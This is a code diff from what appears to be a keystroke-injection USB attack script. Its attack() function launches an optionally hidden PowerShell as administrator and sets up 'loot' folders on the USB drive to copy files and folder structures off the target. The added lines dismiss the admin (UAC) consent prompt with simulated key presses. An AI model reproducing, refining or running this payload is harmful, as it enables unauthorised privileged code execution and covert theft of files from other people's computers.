@@ -46,6 +46,10 @@ function attack() {
     if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");                              // Hide the console if chosen to do so
     press("CTRL SHIFT ENTER");                                                                          // Run as admin
     delay(1000);
+    press("left");                                                                                      // Get rid of admin prompt
+    delay(200);
+    press("enter");
+    delay(200);
     type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name)\n");	                // Replace 'TEMPUSB' with your drive name
     type("$lootPathFiles = $usbPath + \"loot\\files\";mkdir $lootPathFiles;");                          // Create folder structure and define variables for directories
     type("$lootPathFolders = $usbPath + \"loot\\folder_structure\";mkdir $lootPathFolders;");
